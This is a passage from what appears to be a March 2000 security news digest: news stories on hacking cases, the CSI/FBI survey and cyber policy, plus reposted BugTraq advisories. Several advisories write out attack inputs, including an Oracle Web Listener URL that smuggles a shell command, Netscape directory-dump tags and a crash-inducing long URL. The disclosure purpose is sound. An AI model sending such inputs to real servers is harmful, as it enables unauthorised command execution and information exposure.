      information. Only popular files survive for any period of time. Older, 
      unpopular files would be overwritten by more popular ones. 

      "As a project we don't want to be labeled as hackers who distribute warez 
      or copyrighted material," he said. "The purpose of Freenet is to promote 
      freedom of information, but there is an inevitable consequence there that 
      it might lead to violation of copyright law."

      "The potential for protecting freedom of speech is more important than 
      protecting copyright, which is an economic tool," Clarke added.

      Clark noted that Freenet can be functionally identical to Napster, the 
      wildly popular network for sharing music online. But while the Recording 
      Industry Association of America is currently seeking a court order to shut 
      down Napster's central servers, it would be almost impossible to disable a 
      Freenet network running on machines all over the world.

      "Because it's decentralized no one can be held responsible for it," Clarke 
      said. "Once it's released there's no point coming after me because there's 
      nothing I, nor anyone else, can do to shut it down."

      Eric Sheirer, a music technology researcher at MIT's Media Lab, said 
      Freenet is an interesting experiment, but said it would likely be used 
      only by a small community of pirates and "privacy nuts."

      "If it is adopted, it will be adopted by people who want to exchange 
      illegal information and by people who are rabid about privacy and 
      security, which is a relatively small universe," Sheirer said. 

      Sheirer pointed out that the Web is trustworthy because of the content on 
      certain domains, and he likes the convenience of tracking devices such as 
      cookies that remember log-in names and passwords.

      "Many of the advantages of Freenet are disadvantages to me," he said.

      Nonetheless, Sheirer said the advent of Freenet and Gnapster, an 
      open-source clone of Napster, illustrated the need for debate about 
      copyright laws in the age of ubiquitous digital distribution channels.

      "There are larger questions about the implications of these technologies," 
      Sheirer said.

      Federal CIO Needed for
      Web Security
      By Brian Krebs, Newsbytes
      March 24, 2000

      Former Senate Year 2000 Committee Chairman Sen. Robert
      Bennett, R-Utah, said Thursday that the numerous legislative
      and agency efforts to address cyber security may need the
      guidance of a single "chief information officer" to coordinate the
      government's cross agency and trans-industry security
      measures.

      Speaking at a US Chamber of Commerce meeting, "Cyber
      Security: The Real Y2K Challenge," Bennett said that, while it
      is up to company CEOs to ensure the security of their own
      Web sites, the federal government can and should provide a
      overarching structure for that effort.  Bennett said the Clinton
      administration's  Critical Infrastructure Assurance Office (CIAO)
      - the agency charged with coordinating the federal government's
      cyber security efforts - was a good start, but also highlighted a
      need for leadership on the issue.

      "Every company has a chief information officer, and I think
      eventually the government would need its own CIO, maybe even
      at the cabinet level position," Bennett said. "But this is not
      going to happen quickly."

      Over the past few weeks, a handful of public officials have
      called for a federal government CIO to coordinate the
      government's many efforts. Last week before the House
      Subcommittee on Government Management, Information, and
      Technology, Chariman Stephen Horn, R-Calif., pointed to the
      government's many security management players and asked
      whether there shouldn't be one entity coordinating the
      government's efforts.

      "Y2K underscored the need for a disciplined management
      approach to problem solving," Horn said. "That type of
      commitment will be equally important as we turn to the second
      technological challenge of the New Year - computer security."
      Horn then turned to the witnesses, asking, "Could the Koskinen
      model work here?"

      At today's meeting, Bennett told reporters that, regardless of
      the model Congress ultimately chooses, he has heard from
      Koskinen himself on the issue.

      "He told me that with regard to the Critical Infrastructure
      Protection program: 'You have my very best wishes, but you
      will do it without me,'" Bennett said.

      Bennet said the responsibility for protecting the confidentiality
      and security of corporate information rests squarely on the
      shoulders of company CEOs, and those who wait for the
      government to step in with legislative remedies will find their
      sites hacked and their business secrets revealed.

      "This is a CEO and survival issue, not something you leave to
      the techies," he said. "The reality is that if somebody decides
      they want to break into your company and steal your secrets,
      they can do that."

      Bennett urged CEOs in attendance to shift to the mode of
      urgency and cooperation that made Y2K such a non-event, and
      emphasized the need for lawmakers and CEOs to take a
      "horizontal" view of their organization and how weaknesses in
      their companies' systems can affect other companies on the
      network.  

      "We're not thinking horizontally enough in Congress and
      industry," Bennett said. "Nobody's interested in stovepiping: I
      don't care if your company is secure or not, but I do care if
      you're connected to the Internet."

      Bennett said that, given the hectic schedule that Congress is
      working at this session, it was likely that few of the many
      proposed bills to address cyber security would pass this year.
      But, he said, the bills were necessary to keep the dialogue
      going.

      Three teenage computer hackers were warned
      yesterday that they faced deterrent sentences after they
      admitted selling login names and passwords stolen from
      the Internet in the first case of its kind in Hong Kong. 

      One of the trio, a student, was also convicted of
      downloading songs from the Internet and selling them
      for profit. 

      At Eastern Court, restaurant manager Tam Hei-lun and
      clerk Po Yiu-ming, both 19, and student Mak
      King-lam, 18, pleaded guilty to a total of 49 charges. 

      Magistrate Ian Candy remanded them in custody for
      sentencing on April 5, pending reports, and said: "It is
      precisely these kind of computer crimes which leave
      Internet users in fear and make them pause before
      conducting even the most basic of transactions. 

      "These criminal activities should be nipped in the bud
      and a deterrent sentence must be imposed." 

      All the offences took place between March 1998 and
      May last year. 

      David Leung, prosecuting, told the court Po had hacked
      into other Internet users' computers and unlawfully
      obtained 127 login names and passwords given to
      Internet users when they subscribe to an Internet service
      provider for a monthly fee and an hourly rate. 

      The three defendants knew each other through the
      Internet and Po had sold some of his illegally obtained
      login names and passwords to Tam for $3,000, but
      gave others for free to Mak. Tam later resold them for
      $1,500. 

      The three were aware that the information they obtained
      was acquired illegally, the magistrate was told. 

      Mr Leung said the three defendants had hacked into the
      accounts of Internet users of Hongkong Telecom IMS
      Netvigator, Vision Network Ltd, City Telecom (HK),
      Netfront Information Technology and ABC Net, saving
      themselves the monthly fees and causing losses to the
      account holders. 

      Tam admitted 14 counts of obtaining access to a
      computer with a view to dishonest gain, Po admitted 12
      and Mak two. 

      Mak also admitted 10 charges of selling pirated discs, in
      which he downloaded songs from the Internet and sold
      200 discs from his own Web site. Each disc contained
      100 songs and was priced at $88. 

      Tam, who asked buyers of the logins to deposit money
      into his bank account, also admitted eight counts of
      dealing with property known or reasonably believed to
      represent proceeds of an indictable offence. 

      Po admitted a further three charges of criminally
      damaging the computers of three users.

      Hacker breaches security
      to alter Alexandra website
      text

                       By Sonia Gerken

      A Gore computer business has beefed up its security after a
      Brazilian hacker got into one of the websites it manages and
      changed the text. 

      Clive Wilson Computers Gore managing director Ewen
      Whitefield said yesterday the security breach of its domain
      hosting machine last month was low level, but "anyone hacking
      into our machines is serious." 

      The hacker changed text on the website of an Alexandra client.

      Police had been notified of the breach and the company was
      unlikely to pursue it further. 

      "It annoys us more than anything else. If it was a major security
      breach we could chase it back to the United States and Brazil,"
      Mr Whitefield said. 

      If anything the breach proved the company's electronic
      "firewalls" were pretty good, stopping the hacker from getting
      any further than minimal damage, he said. 

      Website designer Ken France, of Arthurton, said the hacker
      probably found a "tiny little hole" to sneak in through. 

      It was an old site, designed two years ago. 

      The breach was annoying and nothing serious - "apart from
      getting a laugh at our expense," he said. 

      There was a big rush of "hits" to the site after the first hacker
      got in. Within a week 200 hits more than usual were logged
      and three or four of those had changed some text, Mr France
      said. 

      "Some even put their telephone number in. 

      "It was like 'If you want to know how I got in here give me a
      call'," he said. 

      The company was warned about the hacking by a phone call
      from someone claiming to be a website watcher in Australia. 

      Mr France said the call came an hour after he had looked at
      the website and it was all right. 

      "It's quite strange how they knew. I suspect it was bogus." 

      Mr Whitefield said the company received an e-mail the day
      after the hacking from the Brazilian Internet Society asking
      questions about the hacker. 

      There was no way to verify the authenticity of the e-mail, he
      said. 

      Mr France said the company's tighter security had been
      affective. 

      At times he had been unable to get into sites he designed that
      were managed by the company. 

      "It's good in a way. If I can't get in, how will anyone else," he
      said.

      9 of 10 Companies Report Computer
      Attacks
      Survey Finds Damages Triple as Cybercrime Booms 
 
      March 22, 2000 
 
      By David Noack 
 
                           SAN FRANCISCO (APBnews.com) -- More
                           than 90 percent of large corporations and
                           government agencies were the victims of
                           computer security breaches in 1999,
                           according to a new survey. 
 
                           The Computer Security Institute's fifth
                           Computer Crime and Security Survey also
                           found that the total reported financial losses
      have tripled. 
 
      The annual survey is conducted with the participation of the San Francisco
      FBI Computer Intrusion Squad and aims to increase awareness of security.
      This year's survey was based on responses from 643 computer-security
      professionals in U.S. corporations, government agencies, financial
      institutions, medical institutions and universities. 
 
      Only 42 percent of those answering the survey could put a dollar figure on
      their financial losses -- reporting the total at $265 million. The average
      annual total over the last three years was $120 million. 
 
      Widespread and diverse
 
      Patrice Rapalus, director of the Computer
      Security Institute, said the survey points to a
      disturbing trend. 
 
      "Cybercrimes and other information-security
      breaches are widespread and diverse," she
      said. "Ninety percent of respondents reported
      attacks. Furthermore, such incidents can
      result in serious damages. ... Clearly, more
      must be done in terms of adherence to sound
      practices, deployment of sophisticated
      technologies, and most importantly, adequate
      staffing and training of information-security
      practitioners in both the private sector and
      government." 
 
      The survey also found: 
 
           70 percent reported a variety of serious computer security breaches
           other than the most common ones of computer viruses, laptop theft
           or employee "net abuse." Other examples included theft of
           proprietary information, financial fraud, system penetration from
           outsiders, denial of service attacks and sabotage of data or
           networks. 
           74 percent acknowledged financial losses due to computer
           breaches. 
           71 percent of respondents detected unauthorized access by
           insiders. For the third year in a row, more respondents -- 59 percent
           -- cited their Internet connection as a frequent point of attack rather
           than their internal systems -- 38 percent -- as a frequent point of
           attack. 
 
      Financial losses larger 
 
      The report said the financial losses in eight of 12 categories were larger
      than in any previous year. In addition, financial losses in four categories
      were higher than the combined total of the three previous years. For
      example, 61 respondents quantified losses due to sabotage of data or
      networks for a total of $27 million. The total financial losses due to
      sabotage for the previous years combined totaled only $10 million. 
 
      As in previous years, the most serious financial losses occurred through
      theft of proprietary information, with 66 respondents reporting losses of $66
      million and financial fraud and 53 reporting $55 million in losses. 
 
      The survey results show that computer crime threats to large corporations
      and government agencies come from both inside and outside their
      electronic perimeters, confirming trends found in prior surveys. 
 
      Bruce J. Gephardt heads the FBI's Northern California office in San
      Francisco, which covers 15 counties, including Silicon Valley. He said the
      survey helps him decide how to deploy his forces instead of reacting to
      computer crises as they occur. 
 
      Trends and crises 
 
      "The results of the CSI/FBI survey provide us with valuable data," Gephardt

      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

      In an annual survey issued on Wednesday, the FBI and the San
      Francisco-based Computer Security Institute showed just how
      pressing: total verifiable losses in 1999 more than doubled to up to
      top $265 million, while more than 90 percent of respondents reported
      detecting some form of security breach.

                        Hacker attack costs rise
                        FBI, CSI: Verifiable losses due to poor
                        security top $265M in 1999
                        March 22, 2000: 7:30 a.m. ET


      SAN FRANCISCO (Reuters) - In a year that saw some of the Internet's best
      known sites seriously hit by hacker attacks, few computer users would
      question that cyber-security is a pressing concern.
           In an annual survey issued on Wednesday, the FBI and the San
      Francisco-based Computer Security Institute showed just how pressing: total
      verifiable losses in 1999 more than doubled to up to top $265 million, while
      more than 90 percent of respondents reported detecting some form of security
      breach.
           Security experts say a large number of attacks go unrecognized, and the
      total is hard to assess, with companies reluctant to admit they've been
      vandalized. But the annual survey gives a clear picture of a worsening problem.
           "The trends are continuing in the same direction. It's going from bad to
      worse in terms of threats from the outside, while the threat from the inside
      doesn't go away," said Richard Power, CSI's editorial director.
           The fifth annual survey of computer crime and security polled some 640
      corporations, banks and government organizations about the state of their
      computer systems.
           Only 42 percent of these respondents could put a dollar figure on what the
      attacks cost them -- but this figure, at $265 million, was more than double the
      average annual total over the last three years.
           While the most common threats -- computer viruses, laptop theft, or
      employee "net abuse" -- continued apace, at least 74 percent of respondents
      reported more serious security breaches including theft of proprietary
      information, financial fraud, system penetration by outsiders, data or network
      sabotage, or "denial of service" attacks designed to take websites out of
      commission.
           Information theft and financial fraud caused the most severe financial
      losses, put at $68 million and $56 million respectively.
           But "denial of service" attacks, like the ones that temporarily paralyzed
      Yahoo!, eBay, Buy.com, and several other websites in February, are also a
      growing problem, Powers said.
           Losses traced to denial of service attacks were only $77,000 in 1998, and
      by 1999 had risen to just $116,250. The new survey, which reports on numbers
      taken before the high-profile February strikes, showed quantified losses up at
      more than $8.2 million.
           "The denial of service showed that many sites are way, way understaffed
      and not adequately secured," Powers said.
           "Maybe a half a dozen sites were attacked in that attack, and 150 sites
      were hacked into to launch the attack. There is a widespread insecurity among
      corporate sites and government sites and the problem is not just technological,
      it is human. There are not enough people working on it."
           Bruce Gephardt, in charge of the Federal Bureau of Investigation's northern
      California office, said the survey revealed how quickly computer security is
      becoming a major problem faced by law enforcement, and how more staff was
      needed to fight it.
           "If the FBI and other law enforcement agencies are to be successful in
      combating this continually increasing problem, we cannot always be placed in
      a reactive mode, responding to computer crises as they happen," Gephardt
      said in a news release.

      Bill Would Protect Firms That Share Hacking Info 

                  
      By David McGuire, Newsbytes WASHINGTON, DC, U.S.A., 21 Mar 2000, 6:00 AM 
      CST

      A new bill aimed at encouraging companies to share information about 
      hacker attacks would provide firms with a limited exemption from the 
      Freedom of Information Act (FOIA). 

      Set to be introduced by Reps. Tom Davis, R-Va. and Jim Moran, D-Va., 
      later this week, the legislation would allow companies to share 
      information about cyberattacks with law enforcers and industry groups, 
      without worrying that such information could come back to haunt them, 
      Davis staffer David Marin said today. 

      "The public interest will be served by companies coming forth to share 
      their information" about attacks, Marin said. Too often now companies do 
      not report cyberattacks for fear that such reports will find their way 
      into the media, he said. 

      While the bill would create a limited shelter under FOIA, it is not 
      intended to allow companies to mask their business dealings, Marin said. 

      When the legislation is completed it will be "narrowly tailored to 
      address (information pertaining to) how the attack was done and what was 
      done to fix the attack," Marin said. The legislation will apply only to 
      telecommunications and information technology infrastructure attacks. 

      Used primarily by the media, FOIA allows members of the press and the 
      public to file legally binding requests for public documents. 

      FOIA already contains an exemption for ongoing criminal investigations, 
      by Davis and Moran are aiming to further protect firms that divulge 
      information about cyberattacks, Marin said.

      DAILY BRIEFING
 
      Court upholds agency reviews of
      employees' Internet use
 
      By Kellie Lunney
      klunney@govexec.com
 
      A federal appeals court has upheld a CIA policy allowing
      agency officials to monitor employees' Internet use. The policy
      had helped convict a federal employee of downloading child
      pornography on government time. 
 
      The CIA's Foreign Broadcast Information Service
      implemented a policy in June 1998 authorizing "electronic
      audits" of employee computers in order to crack down on
      non-business related Internet use. Those audits included
      reviewing employees' e-mail messages and collecting
      information on their Web site visits.
 
      Later that summer, Science Applications International Corp.
      (SAIC), which had a contract to manage FBIS' computer
      network and monitor inappropriate Internet behavior, alerted
      the agency when the keyword "sex" turned up numerous hits in
      a firewall database during a routine test. The hits originated
      from the computer of Mark L. Simons, an electronic engineer
      at FBIS.
 
      FBIS officials then searched Simons' computer and office on
      four occasions, eventually compiling enough evidence to indict
      him on two counts of knowingly receiving and possessing child
      pornography downloaded from the Internet and stored on his
      government hard drive.
 
      Simons claimed that his Fourth Amendment rights had been
      violated during the searches. But a district court upheld the
      searches. Simons was found guilty and was sentenced to 18
      months in jail.
 
      The U.S. Court of Appeals for the Fourth Circuit affirmed that
      decision in late February, saying that Simons failed to prove
      that he had a "legitimate expectation of privacy in the place
      searched or the item seized."
 
      According to the appeals court, "In the final analysis, this case
      involves an employee's supervisor entering the employee's
      government office and retrieving a piece of government
      equipment in which the employee had absolutely no
      expectation of privacy [due to the agency's Internet
      policy]equipment that the employer knew contained
      evidence of crimes committed by the employee in the
      employee's office ... Here, there was a conjunction of the
      conduct that violated the employer's policy and the conduct
      that violated the criminal law."
 
      The court's decision in USA v. Simons (99-4238) is online at
      www.law.emory.edu/4circuit/feb2000/994238.p.html.

      FIGHTING CRIME ON
      COMPUTER 
      LAB GIFTS LET COLLEGE OFFER CLASS
      FULL-TIME 
   
      By LeAnn Spencer 
      Tribune Staff Writer 
      March 21, 2000 
   
      With an eye toward cracking down on cyber crime,
      officials at the College of DuPage on Monday unveiled a
      new state-of-the-art computer lab at the college's
      Suburban Law Enforcement Academy.
   
      There, officers will learn how to track computer criminals,
      from pedophiles who prey on children to shysters out to
      bilk people of money to hackers who infiltrate confidential
      Web sites.
   
      The lab at the Glen Ellyn school also will train officers in
      how to conduct on-line investigations, in computer
      modeling that will enable them to reconstruct a crime
      scene, and in how to present the evidence in court.
   
      The new lab was made possible by a donation from
      Microsoft Corp. and Omni Tech Corp. of 51 new
      personal computers, screens and keyboards; a printer and
      overhead projector; all the necessary software; and
      technical support services.
   
      The equipment and software are valued at $250,000,
      college officials said, and enable the college to create one
      of the nation's few specialized computer crime labs
      dedicated to training law enforcement personnel. No
      civilians will be able to enroll in the 40-hour, weeklong
      classes, which will cost $475 in tuition.
   
      "The industry is very motivated in learning how to tackle
      the problems" of computer crime, Bob Herbold, executive
      vice president and chief operating officer of Microsoft,
      said at a Monday unveiling of the lab.
   
      Until now, the law-enforcement academy has held its
      computer crime classes by borrowing computer space
      elsewhere on campus, and only when regular classes
      were out of session. The new computer lab allows the
      academy to offer classes virtually year-round, reaching
      literally hundreds of officers and prosecutors.
   
      Already, the academy is receiving attention from police
      departments all over the country, as well as Canada,
      officials said.
   
      College officials said that there is a real need for the
      training as police and prosecutors struggle to keep pace
      with the sometimes confusing world of computer crime.
   
      "When this was brand-new technology, it was difficult for
      police departments to follow up," said Mike Sullivan,
      Naperville police detective and an instructor at the law
      enforcement academy.
   
      But understanding the inner workings of computers and
      the Internet, officials said, is no different than learning any
      kind of new technology, whether it be fingerprinting or the
      use of DNA evidence.
   
      One unusual aspect of the lab will be that the police
      officers in the class will be able to pose as children and
      log on to pornographic Web sites or chat rooms where
      Internet users prey on the young. As pedophiles reveal
      themselves, they can be investigated and arrested,
      officials said.
   
      "It used to be that pedophiles would go to the park and
      pick their victims," Sullivan said. "As the Internet came
      along, the Internet has become the virtual park."
   
      Such real-life training is invaluable.
   
      "There's no place else that you can go in and see a felony
      being committed while you are doing police training,"
      Sullivan said.
   
      Sullivan noted that many people wrongly think what they
      do on the Internet cannot be traced.
   
      "When a crime is committed on the Internet, it makes it
      easier for us to track you. It's like committing a crime and
      then leaving your license plate at the scene," he said.
   
      "You can't go on the Internet," he said, "without leaving a
      footprint."

      Patch available for OfficeScan vulnerability
      Posted to BugTraq on March 24, 2000
 
      Security Focus BugTraq ID: 1057
 
      Posted: March 22, 2000
 
      Summary
      =======
      Trend Micro has released a patch that eliminates server security
      vulnerabilities found on OfficeScan Corporate Edition 3.51 or earlier
      versions, running on Windows NT 4 server with Internet Information
      Server (IIS). These versions of OfficeScan allow intruders within a
      firewall to invoke OfficeScan CGIs on the server without
      authentication - bypassing OfficeScan management console
      password protection. These OfficeScan CGIs are intended for
      administrator to manage OfficeScan antivirus running on networked
      workstations via the OfficeScan management console. By gaining
      access to execute these CGIs, hackers can use them to change
      OfficeScan antivirus configurations or to uninstall OfficeScan
      antivirus on thedesktops.
 
      Issues
      ======
      Trend OfficeScan version 3.51 or earlier versions apply inadequate
      security settings on the OfficeScan server CGI components. If a
      malicious user, has the ability to connect to the OfficeScan server
      via a web browser, these CGIs can be executed to send valid
      commands - including uninstall command - to OfficeScan clients. In
      addition, OfficeScan's implementation of user authentication in its
      management console - password protection - was insufficiently
      encrypted, and allows a malicious user to decrypt and gain access
      to the OfficeScan management console. 
 
      Implementation
      ==============
      Trend Micro has released a patch that will secure access to the
      OfficeScan CGIs on the server. The patch program changes the file
      permissions on the OfficeScan CGIs, so only administrators can
      access and execute them. This patch works only on drives
      formatted to use Windows NT file system (NTFS). After applying this
      patch, hackers will no longer be able to remotely invoke OfficeScan
      CGIs without being authenticated as a administrator by NTFS
      security. This patch also prevents hackers, who sniffs for OfficeScan
      management console password over the network, from gaining
      access to the OfficeScan management console. Access to the
      OfficeScan management console or to execute OfficeScan CGIs
      now requires NTFS authentication.
 
      Affected Software Versions
      ==========================
      Trend OfficeScan Corporate Edition 3.0
      Trend OfficeScan Corporate Edition 3.11
      Trend OfficeScan Corporate Edition 3.13
      Trend OfficeScan Corporate Edition 3.50
      Trend OfficeScan Corporate Edition 3.51
      Trend OfficeScan for Microsoft SBS 4.5
 
      This vulnerability is only present when the above software version is
      installed on a Windows NT server with IIS. It is not present when the
      above software version is installed on Novell NetWare servers or
      Windows NT server without IIS.

      Gpm-root problems
      Posted to BugTraq on March 23, 2000

      I've sent report about the following security hole to the authors of
      gpm, but they seemed to ignore the problem. The problem applies to
      every gpm version known by me, for example 1.18.1 and 1.19.0.

      To exploit this problem, gpm-root must be running on a machine and
      the user needs both login to that machine and physical access to
      the keyboard and mouse. 



      gpm-root is a beautiful tool shipped in the gpm package. It pops up
      beautiful menus based on each user's own config file when
      Ctrl+Mousebutton is pressed on the console. 

      When the user selects one of his/her favourite utility from his/her
      own list, gpm-root starts this process with the group and
      supplementary groups of the gpm-root daemon. 



      gpm-root calls setuid() first and setgid() afterwards, hence the later
      one is unsuccessful. The authors completely forgot about calling
      initgroups().

      Esafe Protect Gateway (CVP) problems
      Posted to BugTraq on March 22, 2000

      After notification of the manufacturer here is the full report on
      aproblem noted with Esafe Protect Gateway.

      SUMMARY
      -------

      The Esafe Protect Gateway (ESPG) does not scan some files in
      combination with FireWall-1 and CVP.

      DETAILS
      -------

      If you want the Esafe Protect Gateway to scan all content for the
      presence of a virus you have two options.

      1. Choose to scan anything not listed in the 'safe file types' list. And
      then clear out all entries in that list.

      2. Choose to scan only files listed in the 'dangerous file types' list.
      And then have only one extension listed namely '*'.

      Deciding to rely on extensions seems an indication of a flawed
      designallready. Renaming files is a common practice and can be
      done by anyone capable of operating a keyboard.

      The problem is that anything with the MIME type set to TEXT/HTML
      will not be scanned regardless of the options recommended above.

      A simple test was capable of pointing this out.

      Setup a default Apache server. Copy a virusfile to two location
      beinghttp://website/test1.txt and http://website/test1.html and try to
      download them with your favorite browser. The URL is unique and
      was never used by your browser to minimize the possibilities of
      caches being in place. But forced reloads work properly and are
      sufficiant if you want to replicate this issue. 

      Downloading http://website/test1.html dows nothing to detect the
      virus and it is yours. No protection is offered.
      Downloadinghttp://website/test1.txt will not work as ESPG will now
      intercept the file contain the virus. 

      By adjusting the webserver to send out *.txt as MIME type
      TEXT/HTML and *.html as MIME type TEXT/PLAIN you can now test
      with http://website/test2.txt and http://website/test2.html to verify
      things. Downloading http://website/test2.txt will get you infected as
      ESPG will not scan the file. And downloading
      http://website/test2.html will not work as ESPG detects the virus
      and will prevent it from downloading. 

      CONCLUSION
      ----------

      Esafe Protect Gateway can at present not be trusted to protect you
      from downloading a virus.

      VERSIONS
      --------

      Esafe Protect Gateway v2.1 build 98.
      Virus tables dated March 15, 2000.
      STATUS
      ------

      Manufacturer notified.
      No fix available.
      Results have not been confirmed yet.

      However I was able to verify that the problem lies with Esafe and not
      with Check Point by using Trend Micro's CVP server instead which
      did not suffer from the same problem.

      The Apache project: Jakarta Tomcat contains a serius security
      bug.Tomcat is used together with the Apache web server to serve
      Java Server Pages and Java servlets. 
      Summary from the Tomcat development team advisory is posted
      below:Advisory:

      Delivered with Tomcat is an example (jsp/source.jsp) that can be
      used to deliver the contents of any file on your machine.

      Recommended action:

      The simplest course of action is to simply remove this example from
      your machine. Alternatively, you can replace the associated
      ShowSource.class file with one from the current 3.1 beta.

      Fixes:

      Fixes have been made to the core of Tomcat to not allow any file
      references to be resolved outside of the context being used for the
      resolution.Additionally, a change has been made to
      ShowSource.java to disallow any requests which contain the string
      "..".

      The 3.1 beta 1 release has been refreshed with these fixes applied.

      Microsoft has released a patch that eliminates a securityvulnerability

      allow a malicious user to consume all resources ona web server and

      Frequently asked questions regarding this vulnerability can be
      foundat
      http://www.microsoft.com/technet/security/bulletin/fq00-018.asp.

      Issue
      =====
      IIS 4.0 supports chunked encoding transfers, but does not limit
      thesize of the buffer that can be reserved. This would allow a
      malicioususer to request an extremely large buffer for a POST or
      PUT operation,but never actually send data, thereby blocking
      memory on the serverthat had been allocated to the session. If
      sufficient memory on theserver were blocked in this fashion, it could
      prevent the server fromperforming useful work. There is no capability
      through this attack tocreate, modify or delete data on the server, nor
      is there anycapability to usurp administrative control of the server. If
      themalicious user closed his session, the memory would be released
      andthe server's operation would return to normal. Otherwise, the
      machinecould be put back into normal service by stopping and
      restarting theservice.

      TITLE : 
      Netscape Enterprise Server and '?wp' tags
      DATE : 
      March 17, 2000
      NATURE : 
      Remote user can obtain list of directories on Netscape Enterprise
      Server
      AFFECTED : 
      Netscape Enterprise Server 3.x

      PROBLEM:

      Problem exists in Netscape Enterprise Server that can allow remote
      user to obtain list of directories and subdirectories on the server.

      DETAILS:

      Netscape Enterprise Server with 'Web Publishing' enabled can be
      tricked into displaying the list of directories and subdirectories, if
      usersupplies certain 'tags'. For example:

      http://home.netscape.com/?wp-cs-dump

      will reveal the contents of the root directory on that web
      server.Contents of subdirectories can be obtained as well. Other
      tags that can be used are:

      ?wp-ver-info
      ?wp-html-rend
      ?wp-usr-prop
      ?wp-ver-diff
      ?wp-verify-link
      ?wp-start-ver
      ?wp-stop-ver
      ?wp-uncheckout

      FIXES:

      Disable 'Web Publishing'. It is safe to assume that 'Web Publishing'
      is not the only feature that will 'activate' this problem. We have
      foundfew servers running Netscape Enterprise Server that did not
      have 'WebPublishing' enabled, but were still vulnerable to this
      problem. UntilNetscape makes an official response and clarify what
      is the cause ofthis problem, it is advised that you test your server
      against thisvulnerability, and if you are vulnerable, try to disable
      certainfeatures and services.

      Netscape has been contacted on many occasions, but has failed
      torespond.

      Actual problem :Type existing server in address box, and then
      request for nonexistent file with name >300 symbols. After server
      sends reply to the browseryour system stops responding at all,
      Control+Alt+Del work but youwon't see the box with tasks running
      so only thing you can do isREBOOT.
      Somebody can deface some good website and create a redirectwith
      0 seconds waiting to such link.
      Example : 

      http://www.amsouth.com/(lot of aaaa's).html

      Fix : Delete Decon fix from startup folder :) Now you are vulnerableto
      con/con.

      Cerberus Information Security Advisory
      Posted to BugTraq on March 17, 2000

      Released : 15th March 2000
      Name : Oracle
      Affected Systems : Oracle Web Listener 4.0.x on Windows NT
      Issue : Attackers can run arbitrary commands on the webserver

      Description
      ***********
      The Cerberus Security Team has discovered a number of issues
      with Oracle's Web Listener, part of the Oracle Application Server,
      that can allow aremote attacker to run arbitrary commands on the
      web server

      Details
      *******
      Part of the problem is caused by default settings after OAS has
      beeninstalled. The "ows-bin" virtual directory on an Oracle Web
      Listener is the equivalent of the "cgi-bin" on other web servers and
      by default this is set toC:\orant\ows\4.0\bin - this directory not only
      contains a number of batch files, DLLs andexecutables but also the
      binary image file for the Listener itself. Even if this default setting
      has been changed however you may still be at risk if you have batch
      files in the new "ows-bin" directory.

      Arbitrary Command Execution
      ***************************
      The Oracle Web Listener will execute batch files as CGI scripts and
      bymaking a request to a batch file that requires one or more
      arguments it is possible to execute any command the attacker
      wants by building a special query string. 

      For example the following will give a directory listing: 

      http://charon/ows-bin/perlidlc.bat?&dir 

      It is even possible to use UNC paths so the Listener will connect to
      the remote machine over NBSession, download the executable and
      then execute it.

      By default the Web Listener process runs in security context of
      SYSTEM so anycommands issued by an attacker will run with
      SYSTEM privileges.

      Another problem is that the Listener will expand the "*" character so
      even if the attacker doesn't know the name of a real batch file in the
      "ows-bin"they can request *.bat?&command 

      Executables
      ***********
      Some of the executables in the default directory allow attackers to
      kill services, return configuration information and cause other
      undesirable events tooccur. 

      Solution:
      *********
      Due to the severity of this problem Cerberus recommends that the
      following be actioned immediately.

      If "ows-bin" is the default then using the Oracle Application Server
      Manager remove the ows-bin virtual directory or point it to a more
      benign directory. If "ows-bin" is not the default then verfiy that there
      are no batch files in thisdirectory. A check for this has been added
      to Cerberus' security scanner, CIS available from their website.

      Deja.com does not always escape meta-characters when displaying

      Malicious-HTML vulnerabilities at deja.com
      Posted to BugTraq on March 17, 2000

      Niall Smart, niall@pobox.com

      Synopsis
      ========
      deja.com does not always escape meta-characters when
      displayingUsenet articles. Specifically, the article view
      page(http://www.deja.com/getdoc.xp) and the thread view
      page(http://www.deja.com/viewthread.xp) display the subject of
      thearticle "as is" between title tags.

      This allows an attacker to include arbitrary tags in the HTML sentto
      people reading the attackers article at deja.com.

      There are probably a large number of sites out there with this typeof
      vulnerability, the deja.com example is interesting because it'sa busy
      site with a large amount of relatively users who naivelytrust it.

      Exploit
      =======
      An attacker can embed any tag in the head or body of the HTML
      page.This allows numerous attacks including:

      Cross Site Scripting:

      An attacker can post an article with a link to a script on
      anotherserver and call that script from the onLoad event handler.

      Site Spoofing:

      An attacker can use a meta tag to automatically redirect theuser to
      a spoofed version of deja.com.

      See the CERT advisory referenced below for more information on
      thistype of attack.

      Examples
      ========
      NOTE: The following examples are intended to be harmless,
      however I take no responsibility for any damage caused by following
      these links.

      JavaScript popup:

      http://www.deja.com/getdoc.xp?AN=591804116

      Redirection using meta tag:

      http://www.deja.com/getdoc.xp?AN=591833344

      Notes
      =====

      I haven't thoroughly tested deja.com's pages, there may be
      otherinstances of this error. It would be particularly interesting tofind
      one that didn't require the attacker to include the HTML inthe subject
      field of the article.

      This example illustrates how *not* to approach
      meta-characterescaping. If you call a function to escape
      meta-characters eachtime the data is inserted into the web page, as
      deja.com appear todo, you run the risk of occasionally forgetting to
      do it. deja.comescape correctly in two other places on the article
      view page butforget once. Instead you should escape them earlier in
      the dataflow, perhaps just after getting the data from the database,
      therebyprecluding the human-error factor.

100.0 HNS:Certificate Validation Error in Netscape Browsers
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      From HNS http://www.net-security.org/
      
      Posted @ March 17, 2000
      The problem is that there is an inherited trust between an
      expiredcertificate and an active certificate, where there really
      shouldn't be. If any trust should be there, it certainly shouldn't be
      with an expired certificate. ... 
      
      Certificate Validation Error in Netscape Browsers
      Posted to BugTraq on March 17, 2000

      This may not be a normal "BugTraq" issue, since it is more a flaw in
      trust in a security design then it is an actual bug in
      software...butnone-the-less I think it is something that should be
      discussed. I haven't checked this with Microsoft IE, I just noticed it
      as being a flaw inNetscape (submitted a bug report to them earlier
      but they are eitherreally busy or have chosen to ignore the report.)
      Tested in browsers from 4.07 - 4.72, all which operated in the same
      fashion.

      What is the issue?

      The scenario is that a user accesses a website for which they do
      notcurrently have trust for the signer of the certificate. They are
      asked whether they would like to trust the server certificate (until
      itexpires,) which if they respond yes, the web site signer certificate
      will be stored in the certificate database. You can check on
      thesecertificates by clicking on the Security Icon on the browser,
      then select the Website item from the menu. Once stored in the
      database, any future access to this site is permitted without
      warning. The error occurs when the web site certificate is expired
      and the new site certificate is valid, Netscape never checks to see if
